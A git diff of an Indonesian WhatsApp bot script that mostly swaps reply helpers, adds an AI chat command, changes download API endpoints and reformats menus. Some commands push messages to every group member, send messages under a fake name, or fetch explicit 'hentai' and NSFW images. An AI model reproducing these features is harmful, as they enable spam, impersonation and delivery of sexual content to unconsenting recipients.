                         let media = await quoted.download()
                         let anu = await UguuSe(media)
                         await m.reply({
@@ -6891,7 +6882,7 @@ case 'profile':
                 if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                 const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                 spawn('convert', [
@@ -6926,7 +6917,7 @@ case 'profile':
                 if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                 const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                 spawn('convert', [
@@ -6961,7 +6952,7 @@ case 'profile':
                 if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                 const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                 spawn('convert', [
@@ -6996,7 +6987,7 @@ case 'profile':
                 if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                 const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                 spawn('convert', [
@@ -7053,7 +7044,7 @@ case 'profile':
                     if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                     if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                     if (/audio/.test(mime)) {
-                        m.reply(mess.wait)
+                        Replyx(mess.wait)
                         let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                         let ran = `./database/sampah/${getRandom('.mp3')}`;
                         exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
@@ -7092,6 +7083,36 @@ case 'profile':
                 }
             }
             break
+            //ai menu
+            case 'gpt': {
+                if (!text) return m.reply(`Example: ${prefix + command} query`, {
+                    quoted: fkontak1
+                });
+                try {
+                    let response = await axios.get(`https://api.agungny.my.id/api/aiLogic?q=jawab%20dengan%20bahasa%indonesia${encodeURIComponent(text)}`);
+                    m.reply(response.data.result);
+                } catch (e) {
+                    try {
+                        let hasil = await youSearch(text);
+                        m.reply(hasil);
+                    } catch (e) {
+                        try {
+                            let hasil = await bk9Ai(text);
+                            m.reply(hasil.BK9);
+                        } catch (e) {
+                            m.reply(pickRandom([
+                                'Fitur Ai sedang bermasalah!',
+                                'Tidak dapat terhubung ke ai!',
+                                'Sistem Ai sedang sibuk sekarang!',
+                                'Fitur sedang tidak dapat digunakan!'
+                            ]), {
+                                quoted: fkontak1
+                            });
+                        }
+                    }
+                }
+            }
+            break;
             case 'ai': {
                 if (!text) return m.reply(`Example: ${prefix + command} query`, {
                     quoted: fkontak1
@@ -7164,7 +7185,7 @@ case 'profile':
                     let data = await response.json();
 
                     if (!data || !data.result || data.result.length === 0) {
-                        return m.reply('Tidak ditemukan grup WhatsApp yang sesuai dengan pencarian!');
+                        return Replyx('Tidak ditemukan grup WhatsApp yang sesuai dengan pencarian!');
                     }
 
                     let hasil = `*📌 Hasil Pencarian Grup WhatsApp: "${text}" 📌*\n\n`;
@@ -7258,7 +7279,7 @@ case 'profile':
                     let data = await response.json();
 
                     if (!data || !data.result || data.result.length === 0) {
-                        return m.reply('❌ Lagu tidak ditemukan!', {
+                        return Replyx('❌ Lagu tidak ditemukan!', {
                             quoted: fkontak1
                         })
                     }
@@ -7297,12 +7318,10 @@ case 'profile':
                         key: m.key
                     }
                 })
-                if (!text) return m.reply(`Example: ${prefix + command} dj komang`, {
-                    quoted: fkontak1
-                }, {
+                if (!q) return Replyx(`Example: ${prefix + command} dj komang`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 try {
                     const res = await yts.search(text);
                     const hasil = pickRandom(res.all)
@@ -7338,7 +7357,7 @@ case 'profile':
                         pixivdl
                     } = require('./lib/pixiv')
                     let res = await pixivdl(text)
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     for (let i = 0; i < res.media.length; i++) {
                         let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
                         let mime = (await FileType.fromBuffer(res.media[i])).mime
@@ -7434,7 +7453,7 @@ case 'profile':
                     let {
                         objects
                     } = await res.json()
-                    if (!objects.length) return m.reply('Pencarian Tidak di temukan', {
+                    if (!objects.length) return Replyx('Pencarian Tidak di temukan', {
                         quoted: fkontak1
                     })
                     let txt = objects.map(({
@@ -7483,13 +7502,13 @@ case 'profile':
             // Downloader Menu
             case 'ytmp3':
             case 'ytaudio':
-            case 'ytplayaudio': {
+            case 'ytplayaudio': {            
                 if (!isLimit) return m.reply(mess.limit)
                 if (!text) return m.reply(`Example: ${prefix + command} url_youtube`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
-                m.reply(mess.wait)
+                if (!text.includes('youtu')) return Replyx('Url Tidak Mengandung Result Dari Youtube!')
+                Replyx(mess.wait)
                 try {
                     const hasil = await ytMp3(text);
                     await m.reply({
@@ -7512,7 +7531,7 @@ case 'profile':
                     setLimit(m, db)
                 } catch (e) {
                     try {
-                        let hasil = await fetchJson('https://ytdl.axeel.my.id/api/download/audio?url=' + text)
+                        let hasil = await fetchJson('https://api.siputzx.my.id/api/d/ytmp3?url=' + text)
                         await Xlesy.sendFileUrl(m.chat, hasil.downloads.url, hasil.metadata.title, m)
                         setLimit(m, db)
                     } catch (e) {
@@ -7536,8 +7555,8 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} url_youtube`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
-                m.reply(mess.wait)
+                if (!text.includes('youtu')) return Replyx('Url Tidak Mengandung Result Dari Youtube!')
+                Replyx(mess.wait)
                 try {
                     const hasil = await ytMp4(text);
                     await m.reply({
@@ -7570,11 +7589,11 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} url_instagram`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('instagram.com')) return m.reply('Url Tidak Mengandung Result Dari Instagram!')
-                m.reply(mess.wait)
+                if (!text.includes('instagram.com')) return Replyx('Url Tidak Mengandung Result Dari Instagram!')
+                Replyx(mess.wait)
                 try {
                     const hasil = await instagramDl(text);
-                    if (hasil.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
+                    if (hasil.length < 0) return Replyx('Postingan Tidak Tersedia atau Privat!')
                     for (let i = 0; i < hasil.length; i++) {
                         await Xlesy.sendFileUrl(m.chat, hasil[i].url, 'Done', m)
                     }
@@ -7584,7 +7603,7 @@ case 'profile':
                         let hasil = await fetchJson(api('hitori', '/download/instagram', {
                             url: text
                         }, 'apikey'))
-                        if (hasil.result.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
+                        if (hasil.result.length < 0) return Replyx('Postingan Tidak Tersedia atau Privat!')
                         for (let i = 0; i < hasil.result.length; i++) {
                             await Xlesy.sendFileUrl(m.chat, hasil.result[i].imageUrl, 'Done', m)
                         }
@@ -7604,7 +7623,7 @@ case 'profile':
                 })
                 try {
                     const hasil = await instaStory(text);
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     for (let i = 0; i < hasil.results.length; i++) {
                         await Xlesy.sendFileUrl(m.chat, hasil.results[i].url, 'Done', m)
                     }
@@ -7626,10 +7645,10 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
+                if (!text.includes('tiktok.com')) return Replyx('Url Tidak Mengandung Result Dari Tiktok!')
                 try {
                     const hasil = await tiktokDl(text);
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     if (hasil && hasil.size_nowm) {
                         await Xlesy.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
                     } else {
@@ -7651,10 +7670,10 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
+                if (!text.includes('tiktok.com')) return Replyx('Url Tidak Mengandung Result Dari Tiktok!')
                 try {
                     const hasil = await tiktokDl(text);
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     await m.reply({
                         audio: {
                             url: hasil.music_info.url
@@ -7691,13 +7710,13 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} url_facebook`, {
                     quoted: fkontak1
                 })
-                if (!text.includes('facebook.com')) return m.reply('Url Tidak Mengandung Result Dari Facebook!')
+                if (!text.includes('facebook.com')) return Replyx('Url Tidak Mengandung Result Dari Facebook!')
                 try {
                     const hasil = await facebookDl(text);
                     if (hasil.results.length < 1) {
                         m.reply('Video Tidak ditemukan!')
                     } else {
-                        m.reply(mess.wait)
+                        Replyx(mess.wait)
                         await Xlesy.sendFileUrl(m.chat, hasil.results[0].url, `*🎐Title:* ${hasil.caption}`, m);
                     }
                     setLimit(m, db)
@@ -7711,7 +7730,7 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`, {
                     quoted: fkontak1
                 })
-                if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return m.reply('Url Invalid!')
+                if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return Replyx('Url Invalid!')
                 try {
                     const anu = await mediafireDl(text)
                     await Xlesy.sendMedia(m.chat, anu.link, decodeURIComponent(anu.name), `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${decodeURIComponent(anu.name)}\n*${setv} Size* : ${anu.size}`, m)
@@ -7726,10 +7745,10 @@ case 'profile':
                 if (!text) return m.reply(`Example: ${prefix + command} https://open.spotify.com/track/0JiVRyTJcJnmlwCZ854K4p`, {
                     quoted: fkontak1
                 })
-                if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) return m.reply('Url Invalid!')
+                if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) return Replyx('Url Invalid!')
                 try {
                     const hasil = await spotifyDl(text);
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     await m.reply({
                         audio: {
                             url: hasil.download
@@ -7790,12 +7809,12 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 break;
             }
             case 'replay': {
-                if (!isOwner) return m.reply('❌ Hanya owner yang bisa menggunakan perintah ini.', {
+                if (!isOwner) return Replyx('❌ Hanya owner yang bisa menggunakan perintah ini.', {
                     quoted: fkontak1
                 });
 
                 let args = m.text.split(' ');
-                if (args.length < 3) return m.reply('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
+                if (args.length < 3) return Replyx('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
                     quoted: fkontak1
                 });
 
@@ -7827,12 +7846,12 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 break;
             }
             case 'replay1': {
-                if (!isOwner) return m.reply('❌ Hanya owner yang bisa menggunakan perintah ini.', {
+                if (!isOwner) return Replyx('❌ Hanya owner yang bisa menggunakan perintah ini.', {
                     quoted: fkontak1
                 })
 
                 let args = m.text.split(' ')
-                if (args.length < 3) return m.reply('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
+                if (args.length < 3) return Replyx('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', {
                     quoted: fkontak1
                 })
 
@@ -7891,8 +7910,8 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             break
 
             case 'svsontact': {
-                if (!m.quoted) return m.reply('Reply ke pesan yang ingin disimpan sebagai kontak.')
-                if (!text) return m.reply('Tambahkan nama kontak setelah perintah, contoh: .svcontact Nama Kontak')
+                if (!m.quoted) return Replyx('Reply ke pesan yang ingin disimpan sebagai kontak.')
+                if (!text) return Replyx('Tambahkan nama kontak setelah perintah, contoh: .svcontact Nama Kontak')
 
                 let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${text}\nTEL;waid=${m.quoted.sender.split('@')[0]}:${m.quoted.sender.split('@')[0]}\nEND:VCARD`;
 
@@ -7945,12 +7964,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             }
 
             case 'musicmenu': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
+                Replyx(mess.wait)
                 let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal
 
                 let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
@@ -7989,12 +8003,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 }, {
                     quoted: ftroli
                 })
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '✅',
-                        key: m.key
-                    }
-                })
+                
             }
             break
             case 'playmusic': {
@@ -8003,7 +8012,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 // Jika user tidak memasukkan nama file, tampilkan daftar lagu
                 if (!text) {
                     let files = fs.readdirSync(folderPath).filter(file => file.endsWith('.mp3'));
-                    if (files.length === 0) return m.reply('Tidak ada file musik yang tersedia.');
+                    if (files.length === 0) return Replyx('Tidak ada file musik yang tersedia.');
 
                     let fileList = files.map(file => `- ${file.replace('.mp3', '')}`, {
                         quoted: fkontak1
@@ -8016,7 +8025,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 let fileName = text + '.mp3'; // Menambahkan .mp3 secara otomatis
                 let filePath = `${folderPath}/${fileName}`;
 
-                if (!fs.existsSync(filePath)) return m.reply('File tidak ditemukan di folder yang ditentukan!');
+                if (!fs.existsSync(filePath)) return Replyx('File tidak ditemukan di folder yang ditentukan!');
 
                 let fileBuffer = fs.readFileSync(filePath);
 
@@ -8032,18 +8041,17 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             break;
 
             case 'restartbot': 
-            case 'restart': {
-                if (!isCreator) return m.reply("❌ Kamu bukan pemilik bot!")
-                m.reply(`♻️ *Restarting bot...*
-    _Tunggu samapai selesai Tidak akan ada Pemberitahuan jikalau selsai jdi Anda ketik .menu/lainya agar muncul menu itu berarti proses restart sudah selesai_`, {
-                    quoted: fkontak1
-                })
+case 'restart': {
+    if (!isCreator) return Reply("sorry you are not the bot owner!")
+    m.reply(`♻️ _*Restarting bot..*_ Wait 1 Minutes After Successd`)
+    m.reply(mess.done)
 
-                setTimeout(() => {
-                    process.exit() // Menutup proses bot, sehingga bisa restart otomatis jika menggunakan PM2 atau hosting
-                }, 2000)
-            }
-            break
+    setTimeout(() => {
+        m.reply(mess.done) // Mengirim pesan setelah restart
+        process.exit() // Menutup proses bot
+    }, 2000)                
+}
+break
 
             case 'ytprem':
             case 'apkytprem': {
@@ -8100,7 +8108,7 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                             message += `${article.title}\n${article.description}\n${article.link}\n\n`
                         })
 
-                        if (!message) return m.reply('Tidak dapat menemukan berita Mobile Legends saat ini', {
+                        if (!message) return Replyx('Tidak dapat menemukan berita Mobile Legends saat ini', {
                             quoted: fkontak1
                         })
 
@@ -8228,12 +8236,12 @@ case 'payment': {
                     subtitle: author,
                     hasMediaAttachment: false
                   }),
-                  body: { text: `> SCAN di atas / klik tombol` },
+                  body: { text: `> SCAN di atas / klik tombol untuk copy llink` },
                   nativeFlowMessage: {
                     buttons: [
                       {
                         "name": "cta_copy",
-                        "buttonParamsJson": `{\"display_text\":\"Payment PULSA\",\"id\":\"123456789\",\"copy_code\":\"${qris}\"}`
+                        "buttonParamsJson": `{\"display_text\":\"Payment QRIS\",\"id\":\"123456789\",\"copy_code\":\"${qris}\"}`
                       },
                     ],
                   },
@@ -8317,11 +8325,11 @@ break;
                         key: m.key
                     }
                 })
-                if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di dalam grup!', {
+                if (!m.isGroup) return Replyx('Perintah ini hanya bisa digunakan di dalam grup!', {
                     quoted: fkontak1
                 })
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text) return m.reply('Masukkan pesan yang ingin dikirim ke semua anggota grup!', {
+                if (!text) return Replyx('Masukkan pesan yang ingin dikirim ke semua anggota grup!', {
                     quoted: fkontak1
                 })
 
@@ -8350,10 +8358,10 @@ break;
             break
 
             case 'pushkontak1': {
-                if (!m.isGroup) return m.reply('Fitur ini hanya dapat digunakan di grup.', {
+                if (!m.isGroup) return Replyx('Fitur ini hanya dapat digunakan di grup.', {
                     quoted: fkontak1
                 })
-                if (!isCreator) return m.reply('Hanya owner yang dapat menggunakan fitur ini.', {
+                if (!isCreator) return Replyx('Hanya owner yang dapat menggunakan fitur ini.', {
                     quoted: fkontak1
                 })
 
@@ -8361,7 +8369,7 @@ break;
                     const groupMetadata = await Xlesy.groupMetadata(m.chat)
                     const participants = groupMetadata.participants
 
-                    if (!text) return m.reply('Silakan masukkan pesan yang ingin dikirim.', {
+                    if (!text) return Replyx('Silakan masukkan pesan yang ingin dikirim.', {
                         quoted: fkontak1
                     })
 
@@ -8400,7 +8408,7 @@ break;
             }
 
             case 'pushkontakid': {
-                if (!isCreator) return m.reply('Fitur ini hanya dapat digunakan oleh owner.', {
+                if (!isCreator) return Replyx('Fitur ini hanya dapat digunakan oleh owner.', {
                     quoted: fkontak1
                 })
 
@@ -8754,7 +8762,7 @@ break;
             case 'waifu': {
                 try {
                     if (text == 'nsfw') {
-                        if (!isNsfw) return m.reply('Filter Nsfw Sedang Aktif!')
+                        if (!isNsfw) return Replyx('Filter Nsfw Sedang Aktif!')
                         const res = await fetchJson('https://api.waifu.pics/nsfw/waifu')
                         await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
                     } else {
@@ -8775,14 +8783,14 @@ case 'hentai': {
 
         // Cek apakah respons valid
         if (!res || !res.data || res.data.length === 0) {
-            return m.reply('Gagal mengambil video, coba lagi nanti.');
+            return Replyx('Gagal mengambil video, coba lagi nanti.');
         }
 
         // Ambil URL video pertama
         let videoUrl = res.data[0].video_1 || res.data[0].video_2;
 
         if (!videoUrl) {
-            return m.reply('Tidak ada video yang tersedia.');
+            return Replyx('Tidak ada video yang tersedia.');
         }
 
         await Xlesy.sendMessage(m.chat, { video: { url: videoUrl }, caption: 'Here is your hentai video 🍑' }, { quoted: fkontak1 });
@@ -8796,7 +8804,7 @@ break;
             case 'neko': {
                 try {
                     if (text == 'nsfw') {
-                        if (!isNsfw) return m.reply('Filter Nsfw Sedang Aktif!')
+                        if (!isNsfw) return Replyx('Filter Nsfw Sedang Aktif!')
                         const res = await fetchJson('https://api.waifu.pics/nsfw/neko')
                         await Xlesy.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
                     } else {
@@ -9137,7 +9145,7 @@ break;
             break
             case 'akinator': {
                 if (text == 'start') {
-                    if (akinator[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                    if (akinator[m.sender]) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                     akinator[m.sender] = new Akinator({
                         region: 'id',
                         childMode: false
@@ -9156,7 +9164,7 @@ break;
                         delete akinator[m.sender];
                     }, 3600000)
                 } else if (text == 'end') {
-                    if (!akinator[m.sender]) return m.reply('Kamu tidak Sedang bermain Akinator!')
+                    if (!akinator[m.sender]) return Replyx('Kamu tidak Sedang bermain Akinator!')
                     delete akinator[m.sender];
                     m.reply('Sukses Mengakhiri sessi Akinator')
                 } else m.reply(`Example : ${prefix + command} start/end`, {
@@ -9165,7 +9173,7 @@ break;
             }
             break
             case 'tebakbom': {
-                if (tebakbom[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (tebakbom[m.sender]) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 tebakbom[m.sender] = {
                     petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
                     board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
@@ -9186,7 +9194,7 @@ break;
             }
             break
             case 'tekateki': {
-                if (iGame(tekateki, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tekateki, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tekateki.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9206,7 +9214,7 @@ break;
             }
             break
             case 'tebaklirik': {
-                if (iGame(tebaklirik, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebaklirik, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaklirik.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9226,7 +9234,7 @@ break;
             }
             break
             case 'tebakkata': {
-                if (iGame(tebakkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebakkata, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkata.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9246,7 +9254,7 @@ break;
             }
             break
             case 'family100': {
-                if (family100.hasOwnProperty(m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (family100.hasOwnProperty(m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/family100.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9268,7 +9276,7 @@ break;
             }
             break
             case 'susunkata': {
-                if (iGame(susunkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(susunkata, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/susunkata.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9288,7 +9296,7 @@ break;
             }
             break
             case 'tebakkimia': {
-                if (iGame(tebakkimia, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebakkimia, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakkimia.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9308,7 +9316,7 @@ break;
             }
             break
             case 'caklontong': {
-                if (iGame(caklontong, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(caklontong, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/caklontong.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9331,7 +9339,7 @@ break;
             }
             break
             case 'tebaknegara': {
-                if (iGame(tebaknegara, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebaknegara, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebaknegara.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9351,7 +9359,7 @@ break;
             }
             break
             case 'tebakgambar': {
-                if (iGame(tebakgambar, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebakgambar, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakgambar.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9369,7 +9377,7 @@ break;
             }
             break
             case 'tebakbendera': {
-                if (iGame(tebakbendera, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebakbendera, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/games/tebakbendera.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9391,7 +9399,7 @@ break;
             case 'tebakangka':
             case 'butawarna':
             case 'colorblind': {
-                if (iGame(tebakangka, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(tebakangka, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/random/color_blind.json');
                 const hasil = pickRandom(soal);
                 let {
@@ -9426,11 +9434,11 @@ break;
                     modes
                 } = require('./lib/math');
                 const inputMode = ['noob', 'easy', 'medium', 'hard', 'extreme', 'impossible', 'impossible2'];
-                if (iGame(kuismath, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                if (iGame(kuismath, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                 if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`, {
                     quoted: fkontak1
                 })
-                if (!inputMode.includes(text.toLowerCase())) return m.reply('Mode tidak ditemukan!')
+                if (!inputMode.includes(text.toLowerCase())) return Replyx('Mode tidak ditemukan!')
                 let result = await genMath(text.toLowerCase())
                 let {
                     key
@@ -9466,374 +9474,350 @@ break;
 					profile = fake.anonim
 				}	 
                 let menunya = `
-  ❍───❍「 \`ALLMENU\`📚 」❍───❍
+  ❍───❍「 \`ALLMENU\` 」❍───❍
 				
 ╭──────┈➤「 *\`BOT\`* 」❍
-│ ${setv} ${prefix}claim
-│ ${setv} ${prefix}buy [item] (nominal)
-│ ${setv} ${prefix}transfer
-│ ${setv} ${prefix}leaderboard
-│ ${setv} ${prefix}request (text)
-│ ${setv} ${prefix}react (emoji)
-│ ${setv} ${prefix}tagme
-│ ${setv} ${prefix}runtime
-│ ${setv} ${prefix}totalfitur
-│ ${setv} ${prefix}ping
-│ ${setv} ${prefix}afk
-│ ${setv} ${prefix}rvo (reply pesan viewone)
-│ ${setv} ${prefix}inspect (url gc)
-│ ${setv} ${prefix}addmsg
-│ ${setv} ${prefix}delmsg
-│ ${setv} ${prefix}getmsg
-│ ${setv} ${prefix}listmsg
-│ ${setv} ${prefix}q (reply pesan)
-│ ${setv} ${prefix}menfes (62xxx|fake name)
-│ ${setv} ${prefix}jadibot
-│ ${setv} ${prefix}stopjadibot
-│ ${setv} ${prefix}listjadibot
-│ ${setv} ${prefix}jasajadibot
-│ ${setv} ${prefix}sewa
-│ ${setv} ${prefix}donasi
-│ ${setv} ${prefix}pay
-│ ${setv} ${prefix}apkytprem
+│ ${setv} ${prefix}_*claim*_
+│ ${setv} ${prefix}_*buy [item] (nominal)*_
+│ ${setv} ${prefix}_*transfer*_
+│ ${setv} ${prefix}_*leaderboard*_
+│ ${setv} ${prefix}_*request (text)*_
+│ ${setv} ${prefix}_*react (emoji)*_
+│ ${setv} ${prefix}_*tagme*_
+│ ${setv} ${prefix}_*runtime*_
+│ ${setv} ${prefix}_*totalfitur*_
+│ ${setv} ${prefix}_*ping*_
+│ ${setv} ${prefix}_*afk*_
+│ ${setv} ${prefix}_*rvo (reply pesan viewone)*_
+│ ${setv} ${prefix}_*inspect (url gc)*_
+│ ${setv} ${prefix}_*addmsg*_
+│ ${setv} ${prefix}_*delmsg*_
+│ ${setv} ${prefix}_*getmsg*_
+│ ${setv} ${prefix}_*listmsg*_
+│ ${setv} ${prefix}_*q (reply pesan)*_
+│ ${setv} ${prefix}_*menfes (62xxx|fake name)*_
+│ ${setv} ${prefix}_*jadibot*_
+│ ${setv} ${prefix}_*stopjadibot*_
+│ ${setv} ${prefix}_*listjadibot*_
+│ ${setv} ${prefix}_*jasajadibot*_
+│ ${setv} ${prefix}_*sewa*_
+│ ${setv} ${prefix}_*donasi*_
+│ ${setv} ${prefix}_*pay*_
+│ ${setv} ${prefix}_*apkytprem*_
 ╰─┬────┈➤
-╭─┴─┈➤「 *\`GROUP\`* 」❍
-│ ${setv} ${prefix}add (62xxx)
-│ ${setv} ${prefix}kick (@tag/62xxx)
-│ ${setv} ${prefix}promote (@tag/62xxx)
-│ ${setv} ${prefix}demote (@tag/62xxx)
-│ ${setv} ${prefix}setname (nama baru gc)
-│ ${setv} ${prefix}setdesc (desk)
-│ ${setv} ${prefix}setppgc (reply imgnya)
-│ ${setv} ${prefix}delete (reply pesan)
-│ ${setv} ${prefix}linkgrup
-│ ${setv} ${prefix}revoke
